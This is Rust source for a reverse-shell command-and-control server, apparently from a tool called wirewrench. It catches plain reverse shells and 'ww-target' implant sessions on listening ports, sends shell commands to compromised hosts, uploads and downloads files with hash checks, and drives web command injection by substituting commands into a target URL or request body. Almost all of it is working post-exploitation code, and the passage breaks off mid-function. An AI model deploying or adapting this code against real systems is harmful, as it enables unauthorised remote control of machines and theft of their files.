use std::collections::HashMap;
use std::io::{BufRead, BufReader, Read, Write};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use anyhow::{Context, Result};
use clap::Parser;
use serde_json::json;
use sha2::Digest;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, UnixListener};
use tokio::sync::Mutex;

use wirewrench::target::protocol;
use wirewrench::{Command, Response, ShellInfo, DEFAULT_PORT, DEFAULT_SMART_PORT, DEFAULT_SOCKET};

// ── Smart port frame I/O ───────────────────────────────────────────────────

async fn write_frame<W: AsyncWriteExt + Unpin>(w: &mut W, ftype: u8, payload: &[u8]) -> std::io::Result<()> {
    w.write_all(&[ftype]).await?;
    w.write_all(&(payload.len() as u32).to_le_bytes()).await?;
    if !payload.is_empty() {
        w.write_all(payload).await?;
    }
    w.flush().await?;
    Ok(())
}

async fn write_json_frame<W: AsyncWriteExt + Unpin>(w: &mut W, ftype: u8, val: &impl serde::Serialize) -> std::io::Result<()> {
    let json = serde_json::to_string(val).unwrap_or_default();
    write_frame(w, ftype, json.as_bytes()).await
}

async fn read_frame<R: AsyncReadExt + Unpin>(r: &mut R) -> std::io::Result<(u8, Vec<u8>)> {
    let mut header = [0u8; 5];
    r.read_exact(&mut header).await?;
    let ftype = header[0];
    let len = u32::from_le_bytes(header[1..5].try_into().unwrap()) as usize;
    let mut payload = vec![0u8; len];
    if len > 0 {
        r.read_exact(&mut payload).await?;
    }
    Ok((ftype, payload))
}

fn hex_encode(bytes: &[u8]) -> String {
    const HEX: &[u8] = b"0123456789abcdef";
    let mut out = Vec::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(HEX[(b >> 4) as usize]);
        out.push(HEX[(b & 0x0f) as usize]);
    }
    unsafe { String::from_utf8_unchecked(out) }
}

// ── TCP shell session ──────────────────────────────────────────────────────

struct ShellSession {
    id: u32,
    addr: String,
    created: f64,
    alive: Arc<AtomicBool>,
    writer: Arc<Mutex<tokio::net::tcp::OwnedWriteHalf>>,
    _reader_handle: tokio::task::JoinHandle<()>,
}

impl ShellSession {
    fn new(id: u32, addr: String, stream: tokio::net::TcpStream) -> (Self, Arc<Mutex<Vec<u8>>>) {
        let (reader, writer) = stream.into_split();
        let alive = Arc::new(AtomicBool::new(true));
        let buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
        let buf_clone = Arc::clone(&buf);
        let alive_clone = Arc::clone(&alive);

        let reader_handle = tokio::spawn(async move {
            let mut reader = reader;
            let mut tmp = vec![0u8; 65536];
            loop {
                match reader.read(&mut tmp).await {
                    Ok(0) => { alive_clone.store(false, Ordering::SeqCst); break; }
                    Ok(n) => { let mut b = buf_clone.lock().await; b.extend_from_slice(&tmp[..n]); }
                    Err(_) => { alive_clone.store(false, Ordering::SeqCst); break; }
                }
            }
        });

        let session = Self {
            id, addr,
            created: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs_f64(),
            alive: Arc::clone(&alive),
            writer: Arc::new(Mutex::new(writer)),
            _reader_handle: reader_handle,
        };
        (session, buf)
    }

    fn info(&self) -> ShellInfo {
        ShellInfo { id: self.id, addr: self.addr.clone(), created: self.created, alive: self.alive.load(Ordering::SeqCst) }
    }

    fn close(&mut self) {
        self.alive.store(false, Ordering::SeqCst);
        self._reader_handle.abort();
    }
}

// ── Smart session (ww-target on port 4446) ─────────────────────────────────

struct SmartSession {
    id: u32,
    addr: String,
    created: f64,
    writer: Arc<Mutex<tokio::net::tcp::OwnedWriteHalf>>,
    shell_buf: Arc<Mutex<Vec<u8>>>,
    ctrl_queue: Arc<Mutex<std::collections::VecDeque<(u8, Vec<u8>)>>>,
    alive: Arc<AtomicBool>,
    in_file_transfer: Arc<AtomicBool>,
    _reader_handle: tokio::task::JoinHandle<()>,
}

impl SmartSession {
    fn new(id: u32, addr: String, stream: tokio::net::TcpStream) -> Self {
        let (reader, writer) = stream.into_split();
        let writer = Arc::new(Mutex::new(writer));
        let alive = Arc::new(AtomicBool::new(true));
        let shell_buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
        let ctrl_queue: Arc<Mutex<std::collections::VecDeque<(u8, Vec<u8>)>>> = Arc::new(Mutex::new(std::collections::VecDeque::new()));
        let in_file_transfer = Arc::new(AtomicBool::new(false));

        let shell_clone = Arc::clone(&shell_buf);
        let ctrl_clone = Arc::clone(&ctrl_queue);
        let alive_clone = Arc::clone(&alive);
        let ift_clone = Arc::clone(&in_file_transfer);

        let reader_handle = tokio::spawn(async move {
            let mut r = reader;
            loop {
                let (ftype, payload) = match read_frame(&mut r).await {
                    Ok(v) => v,
                    Err(_) => { alive_clone.store(false, Ordering::SeqCst); break; }
                };
                match ftype {
                    protocol::FRAME_SHELL => {
                        let mut b = shell_clone.lock().await;
                        b.extend_from_slice(&payload);
                    }
                    protocol::FRAME_FILE_CTRL | protocol::FRAME_FILE_DATA | protocol::FRAME_HASH => {
                        let mut q = ctrl_clone.lock().await;
                        q.push_back((ftype, payload));
                    }
                    protocol::FRAME_KEEPALIVE => {}
                    protocol::FRAME_CANCEL => {
                        ift_clone.store(false, Ordering::SeqCst);
                    }
                    _ => {}
                }
            }
        });

        Self { id, addr, created: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs_f64(), writer, shell_buf, ctrl_queue, alive, in_file_transfer, _reader_handle: reader_handle }
    }

    fn info(&self) -> ShellInfo {
        ShellInfo { id: self.id, addr: format!("[ww-target] {}", self.addr), created: self.created, alive: self.alive.load(Ordering::SeqCst) }
    }

    fn close(&mut self) {
        self.alive.store(false, Ordering::SeqCst);
        self._reader_handle.abort();
    }
}

// ── Web shell session (behind "web" feature) ───────────────────────────────

#[cfg(feature = "web")]
struct WebShellSession {
    id: u32,
    url: String,
    injection_point: String,
    method: String,
    body_template: Option<String>,
    headers: Vec<String>,
    cookie: Option<String>,
    created: f64,
    alive: Arc<AtomicBool>,
    buf: Arc<Mutex<Vec<u8>>>,
}

#[cfg(feature = "web")]
impl WebShellSession {
    fn new(id: u32, config: wirewrench::WebShellConfig) -> Self {
        Self {
            id, url: config.url, injection_point: config.injection_point, method: config.method,
            body_template: config.body_template, headers: config.headers, cookie: config.cookie,
            created: SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs_f64(),
            alive: Arc::new(AtomicBool::new(true)),
            buf: Arc::new(Mutex::new(Vec::new())),
        }
    }

    fn info(&self) -> ShellInfo { ShellInfo { id: self.id, addr: format!("[web] {}", self.url), created: self.created, alive: self.alive.load(Ordering::SeqCst) } }
}

// ── Managed sessions ───────────────────────────────────────────────────────

enum ManagedSession {
    Tcp(ShellSession, Arc<Mutex<Vec<u8>>>),
    Smart(SmartSession),
    #[cfg(feature = "web")]
    Web(WebShellSession),
}

impl ManagedSession {
    fn info(&self) -> ShellInfo {
        match self {
            ManagedSession::Tcp(s, _) => s.info(),
            ManagedSession::Smart(s) => s.info(),
            #[cfg(feature = "web")]
            ManagedSession::Web(s) => s.info(),
        }
    }

    fn alive(&self) -> bool {
        match self {
            ManagedSession::Tcp(s, _) => s.alive.load(Ordering::SeqCst),
            ManagedSession::Smart(s) => s.alive.load(Ordering::SeqCst),
            #[cfg(feature = "web")]
            ManagedSession::Web(s) => s.alive.load(Ordering::SeqCst),
        }
    }
}

// ── Session manager ────────────────────────────────────────────────────────

struct SessionManager {
    sessions: HashMap<u32, ManagedSession>,
    next_id: u32,
}

impl SessionManager {
    fn new() -> Self {
        Self { sessions: HashMap::new(), next_id: 1 }
    }

    fn add_tcp(&mut self, addr: String, stream: tokio::net::TcpStream) -> u32 {
        let id = self.next_id; self.next_id += 1;
        let (session, buf) = ShellSession::new(id, addr, stream);
        self.sessions.insert(id, ManagedSession::Tcp(session, buf)); id
    }

    fn add_smart(&mut self, addr: String, stream: tokio::net::TcpStream) -> u32 {
        let id = self.next_id; self.next_id += 1;
        let session = SmartSession::new(id, addr, stream);
        self.sessions.insert(id, ManagedSession::Smart(session)); id
    }

    #[cfg(feature = "web")]
    fn add_web(&mut self, config: wirewrench::WebShellConfig) -> u32 {
        let id = self.next_id; self.next_id += 1;
        self.sessions.insert(id, ManagedSession::Web(WebShellSession::new(id, config))); id
    }

    fn remove(&mut self, id: u32) {
        if let Some(s) = self.sessions.remove(&id) {
            match s {
                ManagedSession::Tcp(mut s, _) => s.close(),
                ManagedSession::Smart(mut s) => s.close(),
                #[cfg(feature = "web")]
                ManagedSession::Web(_) => {}
            }
        }
    }

    fn list(&self) -> Vec<ShellInfo> {
        self.sessions.values().map(|s| s.info()).collect()
    }
}

// ── CLI args ───────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(name = "ww-server", about = "Catch and manage reverse shells")]
struct Args {
    #[arg(short = 'p', long, default_value_t = DEFAULT_PORT)]
    port: u16,

    #[arg(short = 'P', long = "smart-port", default_value_t = DEFAULT_SMART_PORT)]
    smart_port: u16,

    #[arg(short = 'H', long, default_value = "0.0.0.0")]
    host: String,

    #[arg(short = 's', long, default_value = DEFAULT_SOCKET)]
    socket: String,
}

// ── TCP listener for dumb shells (port 4444) ───────────────────────────────

async fn tcp_listener(manager: Arc<Mutex<SessionManager>>, host: &str, port: u16) -> Result<()> {
    let addr = format!("{}:{}", host, port);
    let listener = TcpListener::bind(&addr).await
        .with_context(|| format!("Failed to bind TCP on {}", addr))?;
    eprintln!("[+] Listening for reverse shells on {}", addr);

    loop {
        match listener.accept().await {
            Ok((stream, peer)) => {
                let addr = peer.to_string();
                let mgr = Arc::clone(&manager);
                tokio::spawn(async move {
                    let id = { let mut mg = mgr.lock().await; mg.add_tcp(addr.clone(), stream) };
                    eprintln!("[+] Shell #{} caught from {}", id, addr);
                    loop {
                        let alive = { let mg = mgr.lock().await; mg.sessions.get(&id).map(|s| s.alive()).unwrap_or(false) };
                        if !alive { break; }
                        tokio::time::sleep(Duration::from_millis(500)).await;
                    }
                    let mut mg = mgr.lock().await; mg.remove(id);
                    eprintln!("[-] Shell #{} disconnected", id);
                });
            }
            Err(e) => eprintln!("[-] Accept error: {}", e),
        }
    }
}

// ── Smart listener for ww-target (port 4446) ────────────────────────────────

async fn smart_listener(manager: Arc<Mutex<SessionManager>>, host: &str, port: u16) -> Result<()> {
    let addr = format!("{}:{}", host, port);
    let listener = TcpListener::bind(&addr).await
        .with_context(|| format!("Failed to bind smart port on {}", addr))?;
    eprintln!("[+] Listening for ww-target on {}", addr);

    loop {
        match listener.accept().await {
            Ok((mut stream, peer)) => {
                let addr = peer.to_string();
                let mgr = Arc::clone(&manager);
                tokio::spawn(async move {
                    // Read handshake frame
                    let (ftype, payload) = match read_frame(&mut stream).await {
                        Ok(v) => v,
                        Err(e) => { eprintln!("[-] Smart handshake read error: {}", e); return; }
                    };
                    if ftype != protocol::FRAME_HANDSHAKE {
                        eprintln!("[-] Expected handshake from {}, got frame {}", addr, ftype);
                        return;
                    }
                    let hs: protocol::Handshake = match serde_json::from_slice(&payload) {
                        Ok(h) => h,
                        Err(e) => { eprintln!("[-] Invalid handshake from {}: {}", addr, e); return; }
                    };

                    let session_id = uuid::Uuid::new_v4().to_string();
                    let id = { let mut mg = mgr.lock().await; mg.add_smart(addr.clone(), stream) };

                    // Send handshake response
                    let resp = protocol::Handshake::new_server(session_id);
                    match {
                        let mg = mgr.lock().await;
                        match mg.sessions.get(&id) {
                            Some(ManagedSession::Smart(s)) => {
                                let mut w = s.writer.lock().await;
                                write_json_frame(&mut *w, protocol::FRAME_HANDSHAKE, &resp).await
                            }
                            _ => Ok(()),
                        }
                    } {
                        Ok(_) => eprintln!("[+] [ww-target] Session #{} from {} ({})", id, addr, hs.hostname.as_deref().unwrap_or("?")),
                        Err(e) => { eprintln!("[-] Failed to send handshake to #{}: {}", id, e); return; }
                    }

                    loop {
                        let alive = { let mg = mgr.lock().await; mg.sessions.get(&id).map(|s| s.alive()).unwrap_or(false) };
                        if !alive { break; }
                        tokio::time::sleep(Duration::from_millis(500)).await;
                    }
                    let mut mg = mgr.lock().await; mg.remove(id);
                    eprintln!("[-] [ww-target] Session #{} disconnected", id);
                });
            }
            Err(e) => eprintln!("[-] Smart accept error: {}", e),
        }
    }
}

// ── Web shell HTTP helpers ─────────────────────────────────────────────────

#[cfg(feature = "web")]
fn url_encode(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    for byte in input.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => result.push(byte as char),
            b' ' => result.push_str("%20"),
            _ => result.push_str(&format!("%{:02X}", byte)),
        }
    }
    result
}

#[cfg(feature = "web")]
fn inject_in_url(url: &str, injection: &str, command: &str) -> String {
    url.replace(injection, &url_encode(command))
}

#[cfg(feature = "web")]
fn inject_in_body(body: &str, injection: &str, command: &str) -> String {
    body.replace(injection, command)
}

#[cfg(feature = "web")]
async fn web_shell_exec(config: &wirewrench::WebShellConfig, command: &str) -> Result<String> {
    use reqwest::Client;
    let client = Client::new();
    let injected_url = inject_in_url(&config.url, &config.injection_point, command);
    let mut req = match config.method.as_str() {
        "POST" => client.post(&injected_url),
        "PUT" => client.put(&injected_url),
        "DELETE" => client.delete(&injected_url),
        "PATCH" => client.patch(&injected_url),
        _ => client.get(&injected_url),
    };
    for h in &config.headers {
        if let Some((k, v)) = h.split_once(':') { req = req.header(k.trim(), v.trim()); }
    }
    if let Some(body_template) = &config.body_template {
        req = req.body(inject_in_body(body_template, &config.injection_point, command));
    }
    if let Some(cookie) = &config.cookie { req = req.header("Cookie", cookie); }
    let resp = req.send().await?;
    let status = resp.status();
    let body = resp.text().await?;
    if !status.is_success() { eprintln!("[!] HTTP {} for command via {}", status.as_u16(), config.url); }
    Ok(body)
}

// ── Buffer read helper ─────────────────────────────────────────────────────

async fn read_from_buf(buf: &Mutex<Vec<u8>>, timeout: f64) -> String {
    let start = std::time::Instant::now();
    loop {
        {
            let mut b = buf.lock().await;
            if !b.is_empty() {
                let output = String::from_utf8_lossy(&b).to_string();
                b.clear();
                return output;
            }
        }
        if start.elapsed().as_secs_f64() >= timeout {
            return String::new();
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

async fn read_ctrl_queue_msg(q: &Mutex<std::collections::VecDeque<(u8, Vec<u8>)>>, timeout: f64) -> Option<(u8, Vec<u8>)> {
    let start = std::time::Instant::now();
    loop {
        if start.elapsed().as_secs_f64() > timeout {
            return None;
        }
        let mut queue = q.lock().await;
        if let Some(item) = queue.pop_front() {
            return Some(item);
        }
        drop(queue);
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
}

// ── Handle a single control client ─────────────────────────────────────────

async fn handle_control(stream: tokio::net::UnixStream, manager: Arc<Mutex<SessionManager>>) -> Result<()> {
    
    let mut stream: std::os::unix::net::UnixStream = stream.into_std()?;
    stream.set_nonblocking(false)?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    let mut buf_reader = BufReader::new(&stream);
    let mut line = String::new();
    buf_reader.read_line(&mut line)?;
    if line.is_empty() { return Ok(()); }
    let cmd: Command = serde_json::from_str(line.trim())?;
    let action = &cmd.action;
    let push_buffered = buf_reader.buffer().to_vec();
    drop(buf_reader);

    macro_rules! respond {
        ($resp:expr) => {{ let json = serde_json::to_string(&$resp)? + "\n"; stream.write_all(json.as_bytes())?; }};
    }

    match action.as_str() {
        "list" => { let mg = manager.lock().await; respond!(Response::with_shells(json!(mg.list()))); }

        "send" => send_handler(cmd, &manager, &mut stream).await?,
        "read" => read_handler(cmd, &manager, &mut stream).await?,
        "push" => push_handler(cmd, &manager, &mut stream, push_buffered).await?,
        "pull" => pull_handler(cmd, &manager, &mut stream).await?,
        "targ_cancel" => targ_cancel_handler(cmd, &manager).await?,
        "close" => { let mut mg = manager.lock().await; mg.remove(cmd.id.unwrap_or(0)); respond!(Response::ok()); }

        #[cfg(feature = "web")]
        "register_web" => {
            let config: wirewrench::WebShellConfig = match serde_json::from_str(&cmd.data.unwrap_or_default()) {
                Ok(c) => c, Err(e) => { respond!(Response::error(format!("Invalid config: {}", e))); return Ok(()); }
            };
            let id = { let mut mg = manager.lock().await; mg.add_web(config) };
            respond!(Response::with_shells(json!({"id": id})));
        }

        "interact" => interact_handler(cmd, &manager, &mut stream).await?,
        _ => respond!(Response::error(format!("Unknown action: {}", action))),
    }
    Ok(())
}

// ── Send handler ────────────────────────────────────────────────────────────

async fn send_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let command = cmd.data.unwrap_or_default().trim().to_string();
    let wait = cmd.wait.unwrap_or(false);
    let timeout = cmd.timeout.unwrap_or(3.0);

    macro_rules! respond { ($resp:expr) => {{ let j = serde_json::to_string(&$resp)? + "\n"; stream.write_all(j.as_bytes())?; }}; }

    // Smart
    if let Some((writer, buf, ift, alive)) = {
        let mg = manager.lock().await;
        match mg.sessions.get(&id) {
            Some(ManagedSession::Smart(s)) => Some((Arc::clone(&s.writer), Arc::clone(&s.shell_buf), Arc::clone(&s.in_file_transfer), Arc::clone(&s.alive))),
            _ => None,
        }
    } {
        if !alive.load(Ordering::SeqCst) { respond!(Response::error("Target dead")); return Ok(()); }
        if ift.load(Ordering::SeqCst) { respond!(Response::error("Session busy with file transfer")); return Ok(()); }
        let to_send = format!("{}\n", command);
        { let mut w = writer.lock().await; write_frame(&mut *w, protocol::FRAME_SHELL, to_send.as_bytes()).await?; }
        if wait { let output = read_from_buf(&buf, timeout).await; respond!(Response::with_output(output)); }
        else { let _ = read_from_buf(&buf, 0.3).await; respond!(Response::ok()); }
        return Ok(());
    }

    // TCP
    if let Some((writer, buf)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Tcp(s, b)) => Some((Arc::clone(&s.writer), Arc::clone(b))), _ => None } } {
        let to_send = format!("{}\n", command);
        { let mut w = writer.lock().await; let _ = w.write_all(to_send.as_bytes()).await; }
        if wait { let output = read_from_buf(&buf, timeout).await; respond!(Response::with_output(output)); } else { let _ = read_from_buf(&buf, 0.3).await; respond!(Response::ok()); }
        return Ok(());
    }

    // Web
    #[cfg(feature = "web")]
    if let Some((config, buf)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Web(s)) => Some((wirewrench::WebShellConfig { url: s.url.clone(), injection_point: s.injection_point.clone(), method: s.method.clone(), body_template: s.body_template.clone(), headers: s.headers.clone(), cookie: s.cookie.clone() }, Arc::clone(&s.buf))), _ => None } } {
        match web_shell_exec(&config, &command).await {
            Ok(body) => { if wait { respond!(Response::with_output(body)); } else { *buf.lock().await = body.into_bytes(); respond!(Response::ok()); } }
            Err(e) => respond!(Response::error(e.to_string())),
        }
        return Ok(());
    }

    respond!(Response::error("Shell not found"));
    Ok(())
}

// ── Read handler ────────────────────────────────────────────────────────────

async fn read_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let timeout = cmd.timeout.unwrap_or(0.2);

    macro_rules! respond { ($resp:expr) => {{ let j = serde_json::to_string(&$resp)? + "\n"; stream.write_all(j.as_bytes())?; }}; }

    // Smart
    if let Some(buf) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Smart(s)) => Some(Arc::clone(&s.shell_buf)), _ => None } } {
        respond!(Response::with_output(read_from_buf(&buf, timeout).await)); return Ok(());
    }

    // TCP
    if let Some(buf) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Tcp(_, b)) => Some(Arc::clone(b)), _ => None } } {
        respond!(Response::with_output(read_from_buf(&buf, timeout).await)); return Ok(());
    }

    // Web
    #[cfg(feature = "web")]
    if let Some(buf) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Web(s)) => Some(Arc::clone(&s.buf)), _ => None } } {
        respond!(Response::with_output(read_from_buf(&buf, timeout).await)); return Ok(());
    }

    respond!(Response::error("Shell not found"));
    Ok(())
}

// ── Push handler ────────────────────────────────────────────────────────────

async fn push_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream, buffered: Vec<u8>) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let pc: PushCommand = match serde_json::from_str(&cmd.data.unwrap_or_default()) { Ok(p) => p, Err(e) => { respond_error(stream, format!("Invalid push: {}", e)).await; return Ok(()); } };

    // Smart
    if let Some((writer, ctrl_queue, ift, alive)) = {
        let mg = manager.lock().await;
        match mg.sessions.get(&id) {
            Some(ManagedSession::Smart(s)) if s.alive.load(Ordering::SeqCst) => Some((
                Arc::clone(&s.writer), Arc::clone(&s.ctrl_queue), Arc::clone(&s.in_file_transfer), Arc::clone(&s.alive)
            )),
            _ => None,
        }
    } {
        if !alive.load(Ordering::SeqCst) { respond_error(stream, "Target dead").await; return Ok(()); }
        if ift.load(Ordering::SeqCst) || ift.compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst).is_err() {
            respond_error(stream, "File transfer already in progress").await;
            return Ok(());
        }

        // Read file data from control socket
        let size = pc.size as usize;
        let mut data = Vec::with_capacity(size);
        let fb = buffered.len().min(size);
        if fb > 0 { data.extend_from_slice(&buffered[..fb]); }
        if size > fb {
            let mut raw = stream.try_clone().map_err(|e| anyhow::anyhow!("clone: {}", e))?;
            raw.set_read_timeout(Some(Duration::from_secs(30)))?;
            let mut rest = vec![0u8; size - fb];
            raw.read_exact(&mut rest)?;
            data.extend_from_slice(&rest);
        }

        let srv_hash = { let mut h = sha2::Sha256::new(); h.update(&data); hex_encode(&h.finalize()) };

        // Send push_start
        let ps = protocol::PushStart::new(pc.path.clone(), pc.size, srv_hash.clone());
        { let mut w = writer.lock().await; write_json_frame(&mut *w, protocol::FRAME_FILE_CTRL, &ps).await?; }

        // Wait for push_ready from ctrl_queue
        let ready = match read_ctrl_queue_msg(&ctrl_queue, pc.timeout).await {
            Some((_, p)) => match serde_json::from_slice::<serde_json::Value>(&p) { Ok(v) => v, Err(_) => { ift.store(false, Ordering::SeqCst); respond_error(stream, "Invalid push_ready response").await; return Ok(()); } },
            None => { ift.store(false, Ordering::SeqCst); respond_error(stream, "Push ready timeout").await; return Ok(()); },
        };
        if ready["type"] != "push_ready" {
            ift.store(false, Ordering::SeqCst);
            respond_error(stream, format!("Expected push_ready, got {}", ready["type"].as_str().unwrap_or("?"))).await;
            return Ok(());
        }

        // Send file data in chunks
        let chunk_size: usize = 65536;
        for chunk in data.chunks(chunk_size) {
            let mut w = writer.lock().await;
            write_frame(&mut *w, protocol::FRAME_FILE_DATA, chunk).await?;
        }

        // Send push_done
        let pd = protocol::PushDone::new(srv_hash.clone());
        { let mut w = writer.lock().await; write_json_frame(&mut *w, protocol::FRAME_HASH, &pd).await?; }

        // Wait for verification from ctrl_queue
        let resp_v = match read_ctrl_queue_msg(&ctrl_queue, pc.timeout).await {
            Some((_, p)) => match serde_json::from_slice::<serde_json::Value>(&p) { Ok(v) => v, Err(_) => { ift.store(false, Ordering::SeqCst); respond_error(stream, "Invalid push verify response").await; return Ok(()); } },
            None => { ift.store(false, Ordering::SeqCst); respond_error(stream, "Push verify timeout").await; return Ok(()); },
        };
        if resp_v["type"] == "push_verified" {
            respond_ok(stream, format!("Uploaded '{}' — hash verified (SHA-256: {})", pc.path, srv_hash)).await;
        } else if resp_v["type"] == "push_error" {
            respond_error(stream, format!("Push failed on target: {}", resp_v["message"].as_str().unwrap_or("?"))).await;
        } else {
            respond_error(stream, format!("Unexpected response: {}", resp_v["type"].as_str().unwrap_or("?"))).await;
        }
        ift.store(false, Ordering::SeqCst);
        return Ok(());
    }

    // TCP — push not supported on dumb shells
    if let Some(_writer) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Tcp(_, _)) => Some(()), _ => None } } {
        respond_error(stream, "Push only supported on smart (ww-target) sessions").await;
        return Ok(());
    }

    respond_error(stream, "Shell not found").await;
    Ok(())
}

// ── Pull handler ────────────────────────────────────────────────────────────

async fn pull_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    let pc: PullCommand = match serde_json::from_str(&cmd.data.unwrap_or_default()) { Ok(p) => p, Err(e) => { respond_error(stream, format!("Invalid pull: {}", e)).await; return Ok(()); } };

    // Smart
    if let Some((writer, ctrl_queue, ift, alive)) = {
        let mg = manager.lock().await;
        match mg.sessions.get(&id) {
            Some(ManagedSession::Smart(s)) if s.alive.load(Ordering::SeqCst) => Some((
                Arc::clone(&s.writer), Arc::clone(&s.ctrl_queue), Arc::clone(&s.in_file_transfer), Arc::clone(&s.alive)
            )),
            _ => None,
        }
    } {
        if !alive.load(Ordering::SeqCst) { respond_error(stream, "Target dead").await; return Ok(()); }
        if ift.load(Ordering::SeqCst) || ift.compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst).is_err() {
            respond_error(stream, "File transfer already in progress").await;
            return Ok(());
        }

        let pr = protocol::PullRequest::new(pc.path.clone());
        { let mut w = writer.lock().await; write_json_frame(&mut *w, protocol::FRAME_FILE_CTRL, &pr).await?; }

        // Wait for pull_meta from ctrl_queue
        let meta = match read_ctrl_queue_msg(&ctrl_queue, pc.timeout).await {
            Some((_, p)) => match serde_json::from_slice::<serde_json::Value>(&p) { Ok(v) => v, Err(_) => { ift.store(false, Ordering::SeqCst); respond_error(stream, "Invalid download meta").await; return Ok(()); } },
            None => { ift.store(false, Ordering::SeqCst); respond_error(stream, "Pull meta timeout").await; return Ok(()); },
        };
        if meta["type"] == "push_error" {
            ift.store(false, Ordering::SeqCst);
            respond_error(stream, format!("Pull failed on target: {}", meta["message"].as_str().unwrap_or("?"))).await;
            return Ok(());
        }
        if meta["type"] != "pull_meta" {
            ift.store(false, Ordering::SeqCst);
            respond_error(stream, format!("Expected pull_meta, got {}", meta["type"].as_str().unwrap_or("?"))).await;
            return Ok(());
        }

        let size = meta["size"].as_u64().unwrap_or(0) as usize;
        let expected_hash = meta["hash"].as_str().unwrap_or("").to_string();

        // Read entries from ctrl_queue: FILE_DATA (0x04) accumulate, HASH (0x06) means done
        let mut file_data: Vec<u8> = Vec::with_capacity(size);
        let start = std::time::Instant::now();
        loop {
            let remaining = pc.timeout - start.elapsed().as_secs_f64();
            if remaining <= 0.0 {
                ift.store(false, Ordering::SeqCst);
                respond_error(stream, "Pull data timeout").await;
                return Ok(());
            }
            match read_ctrl_queue_msg(&ctrl_queue, remaining).await {
                Some((protocol::FRAME_FILE_DATA, payload)) => {
                    file_data.extend_from_slice(&payload);
                }
                Some((protocol::FRAME_HASH, payload)) => {
                    if let Ok(v) = serde_json::from_slice::<serde_json::Value>(&payload) {
                        if v["type"] == "push_done" {
                            break;
                        } else if v["type"] == "push_error" {
                            ift.store(false, Ordering::SeqCst);
                            respond_error(stream, format!("Download failed: {}", v["message"].as_str().unwrap_or("?"))).await;
                            return Ok(());
                        }
                    }
                }
                _ => {
                    ift.store(false, Ordering::SeqCst);
                    respond_error(stream, "Download data error").await;
                    return Ok(());
                }
            }
        }

        ift.store(false, Ordering::SeqCst);
        // Send success JSON + raw file bytes to client
        let resp = serde_json::json!({"status":"ok","output":format!("Downloaded '{}' ({} bytes, hash: {})", pc.path, size, expected_hash)});
        let resp_line = serde_json::to_string(&resp).unwrap_or_default() + "\n";
        let _ = stream.write_all(resp_line.as_bytes());
        // Write file size (as LE u64) then raw bytes
        let _ = stream.write_all(&(size as u64).to_le_bytes());
        let _ = stream.write_all(&file_data);
        let _ = stream.flush();
        return Ok(());
    }

    respond_error(stream, "Shell not found or smart session required").await;
    Ok(())
}

// ── Cancel handler ──────────────────────────────────────────────────────────

async fn targ_cancel_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>) -> Result<()> {
    let id = cmd.id.unwrap_or(0);
    if let Some(writer) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Smart(s)) => Some(Arc::clone(&s.writer)), _ => None } } {
        let mut w = writer.lock().await;
        let _ = write_frame(&mut *w, protocol::FRAME_CANCEL, &[]).await;
        // in_file_transfer is cleared by the reader task on CANCEL
    }
    Ok(())
}

// ── Interact handler ────────────────────────────────────────────────────────

async fn interact_handler(cmd: Command, manager: &Arc<Mutex<SessionManager>>, stream: &mut std::os::unix::net::UnixStream) -> Result<()> {
    use std::io::Read as _;
    let id = cmd.id.unwrap_or(0);

    macro_rules! r { ($e:expr) => {{ let j = serde_json::to_string(&$e)? + "\n"; stream.write_all(j.as_bytes())?; }}; }
    macro_rules! respond { ($resp:expr) => {{ let j = serde_json::to_string(&$resp)? + "\n"; stream.write_all(j.as_bytes())?; }}; }

    // Smart
    if let Some((writer, buf, alive, ift)) = {
        let mg = manager.lock().await;
        match mg.sessions.get(&id) {
            Some(ManagedSession::Smart(s)) => Some((
                Arc::clone(&s.writer), Arc::clone(&s.shell_buf), Arc::clone(&s.alive), Arc::clone(&s.in_file_transfer)
            )),
            _ => None,
        }
    } {
        if ift.load(Ordering::SeqCst) { respond!(Response::error("Session busy with file transfer")); return Ok(()); }
        r!(serde_json::json!({"status":"ok","message":"Entering target interactive mode"}));
        stream.write_all(b"\r\n[+] Interactive mode. Press Ctrl+C to detach\r\n")?;
        stream.flush()?;

        let mut s2 = stream.try_clone()?;
        let done = Arc::new(AtomicBool::new(false));
        let pc = Arc::new(AtomicBool::new(false));

        // Thread: read from smart buf → control socket
        let b2 = Arc::clone(&buf);
        let a2 = Arc::clone(&alive);
        let d1 = Arc::clone(&done);
        let p1 = Arc::clone(&pc);
